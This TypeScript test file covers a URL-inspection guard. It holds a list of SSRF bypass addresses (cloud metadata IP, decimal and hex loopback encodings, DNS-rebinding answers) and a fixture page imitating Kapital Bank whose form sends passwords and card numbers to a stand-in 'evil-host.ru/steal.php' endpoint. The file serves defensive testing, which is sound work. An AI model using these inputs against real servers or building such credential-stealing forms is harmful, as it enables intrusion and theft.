import './setup.js';
import assert from 'node:assert/strict';
import dns from 'node:dns';
import http from 'node:http';
import https from 'node:https';
import { afterEach, beforeEach, describe, it, mock } from 'node:test';
import { app } from '../src/app.js';
import type { InspectUrlResponse } from '../src/contract.js';
import { extractPageFacts, inspectUrl, isBlockedAddress, registrableDomain } from '../src/urlInspect.js';

/** Any attempt to touch the network fails the test. */
function forbidNetwork() {
  const boom = (): never => {
    throw new Error('network access attempted');
  };
  return {
    httpRequest: mock.method(http, 'request', boom),
    httpsRequest: mock.method(https, 'request', boom),
    lookup: mock.method(dns, 'lookup', boom),
    fetch: mock.method(globalThis, 'fetch', boom),
  };
}

describe('URL guard (no network)', () => {
  let net: ReturnType<typeof forbidNetwork>;
  beforeEach(() => {
    net = forbidNetwork();
  });
  afterEach(() => {
    mock.restoreAll();
  });

  const blocked: [string, string][] = [
    ['http://127.0.0.1', 'BLOCKED_PRIVATE_ADDRESS'],
    ['http://localhost', 'BLOCKED_PRIVATE_ADDRESS'],
    ['http://169.254.169.254/latest/meta-data/', 'BLOCKED_PRIVATE_ADDRESS'],
    ['http://[::1]', 'BLOCKED_PRIVATE_ADDRESS'],
    ['http://10.0.0.5:8080', 'BLOCKED_PRIVATE_ADDRESS'],
    ['http://[::ffff:127.0.0.1]/', 'BLOCKED_PRIVATE_ADDRESS'],
    ['http://2130706433/', 'BLOCKED_PRIVATE_ADDRESS'], // 127.0.0.1 as a decimal integer
    ['http://0x7f.1/', 'BLOCKED_PRIVATE_ADDRESS'],
    ['https://100.64.1.1/', 'BLOCKED_PRIVATE_ADDRESS'],
    ['http://[fd00::1]/', 'BLOCKED_PRIVATE_ADDRESS'],
    ['http://[fe80::1]/', 'BLOCKED_PRIVATE_ADDRESS'],
    ['http://0.0.0.0/', 'BLOCKED_PRIVATE_ADDRESS'],
    ['http://router/', 'BLOCKED_PRIVATE_ADDRESS'],
    ['http://printer.local/', 'BLOCKED_PRIVATE_ADDRESS'],
    ['localhost:3000', 'BLOCKED_PRIVATE_ADDRESS'],
    ['https://example.com:8443/', 'UNSUPPORTED_PORT'],
    ['ftp://example.com/', 'INVALID_URL'],
    ['javascript:alert(1)', 'INVALID_URL'],
    ['http://user:pw@example.com/', 'INVALID_URL'],
    ['http://', 'INVALID_URL'],
  ];

  for (const [url, code] of blocked) {
    it(`rejects ${url} with ${code}`, async () => {
      const started = performance.now();
      const result = await inspectUrl(url);
      assert.equal(result.error, code);
      assert.equal(result.url, url);
      assert.equal(result.finalUrl, null);
      assert.equal(result.httpStatus, null);
      assert.equal(result.domainAgeDays, null);
      assert.deepEqual(result.redirects, []);
      assert.ok(performance.now() - started < 200);
      assert.equal(net.httpRequest.mock.callCount(), 0);
      assert.equal(net.httpsRequest.mock.callCount(), 0);
      assert.equal(net.lookup.mock.callCount(), 0);
      assert.equal(net.fetch.mock.callCount(), 0);
    });
  }

  it('POST /v1/url/inspect returns the inspection', async () => {
    const res = await app.request('/v1/url/inspect', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ url: 'http://169.254.169.254' }),
    });
    assert.equal(res.status, 200);
    const body = (await res.json()) as InspectUrlResponse;
    assert.equal(body.inspection.error, 'BLOCKED_PRIVATE_ADDRESS');
    assert.ok(!Number.isNaN(Date.parse(body.inspection.inspectedAt)));
    assert.equal(net.httpRequest.mock.callCount() + net.lookup.mock.callCount(), 0);
  });
});

describe('URL guard at connect time (DNS rebinding)', () => {
  afterEach(() => {
    mock.restoreAll();
  });

  for (const answer of [['127.0.0.1'], ['93.184.215.14', '10.1.2.3'], ['::1']]) {
    it(`blocks a public hostname resolving to ${answer.join(' + ')}`, async () => {
      mock.method(globalThis, 'fetch', () => Promise.reject(new Error('no RDAP in tests')));
      const lookup = mock.method(
        dns,
        'lookup',
        (_host: string, options: dns.LookupOptions, cb: (err: Error | null, a: dns.LookupAddress[]) => void) => {
          assert.equal(options.all, true);
          cb(
            null,
            answer.map((address) => ({ address, family: address.includes(':') ? 6 : 4 })),
          );
        },
      );
      const result = await inspectUrl('http://rebind.example.com/');
      assert.equal(result.error, 'BLOCKED_PRIVATE_ADDRESS');
      assert.ok(lookup.mock.callCount() >= 1);
    });
  }
});

describe('address classification', () => {
  it('flags non-public IPv4/IPv6 addresses', () => {
    for (const ip of [
      '10.0.0.1',
      '172.16.0.1',
      '172.31.255.255',
      '192.168.1.1',
      '127.0.0.53',
      '169.254.169.254',
      '100.64.0.1',
      '0.0.0.0',
      '224.0.0.251',
      '255.255.255.255',
      '::',
      '::1',
      '::ffff:10.0.0.1',
      '::ffff:7f00:1',
      '64:ff9b::a00:1',
      'fc00::1',
      'fd12:3456::1',
      'fe80::1%en0',
      'ff02::1',
      '2001:db8::1',
    ]) {
      assert.equal(isBlockedAddress(ip), true, ip);
    }
    for (const ip of ['8.8.8.8', '1.1.1.1', '172.32.0.1', '100.128.0.1', '2606:4700:4700::1111', '::ffff:8.8.8.8', '64:ff9b::808:808']) {
      assert.equal(isBlockedAddress(ip), false, ip);
    }
  });

  it('computes registrable domains', () => {
    const cases: [string, string][] = [
      ['login.kapitalbank.az', 'kapitalbank.az'],
      ['a.b.example.com.az', 'example.com.az'],
      ['online.bank.gov.az', 'bank.gov.az'],
      ['WWW.Example.CO.UK', 'example.co.uk'],
      ['user.github.io', 'user.github.io'],
      ['deep.app.my-app.vercel.app', 'my-app.vercel.app'],
      ['secure-update.pages.dev', 'secure-update.pages.dev'],
      ['example.com', 'example.com'],
      ['x.y.example.com.', 'example.com'],
      ['xn--80ak6aa92e.com', 'xn--80ak6aa92e.com'],
      ['8.8.8.8', '8.8.8.8'],
      ['[2606:4700::1111]', '2606:4700::1111'],
      ['com.az', 'com.az'],
    ];
    for (const [host, expected] of cases) assert.equal(registrableDomain(host), expected, host);
  });
});

describe('page facts (static HTML, nothing executed)', () => {
  it('reads title, password/card fields and foreign form actions', () => {
    const html = `<!doctype html><html><head><title>
      Kapital&nbsp;Bank &amp; Online &#8211; Giriş</title></head><body>
      <!-- <input type="password" name="commented"> -->
      <script>const tpl = '<input name="cvv">';</script>
      <form action="https://collect.evil-host.ru/steal.php" method="post">
        <input type=password name=pass>
        <input name="card_number" autocomplete="cc-number">
      </form>
      <form action="/local/submit"><input name="q"></form>
      <form action="https://www.kapitalbank.az/login"></form>
    </body></html>`;
    const facts = extractPageFacts(html, new URL('https://kapitalbank.az.secure-login.top/'));
    assert.equal(facts.pageTitle, 'Kapital Bank & Online – Giriş');
    assert.equal(facts.hasPasswordField, true);
    assert.equal(facts.hasCardField, true);
    assert.deepEqual(facts.formActionDomains.sort(), ['evil-host.ru', 'kapitalbank.az']);
  });

  it('ignores inputs inside comments and scripts and same-site actions', () => {
    const html = `<title>Hi</title><!-- <input type="password"> --><script>"<input name='cvv'>"</script>
      <form action="https://login.example.com/x"><input name="explore" type="text"></form>`;
    const facts = extractPageFacts(html, new URL('https://www.example.com/'));
    assert.equal(facts.hasPasswordField, false);
    assert.equal(facts.hasCardField, false);
    assert.deepEqual(facts.formActionDomains, []);
  });
});
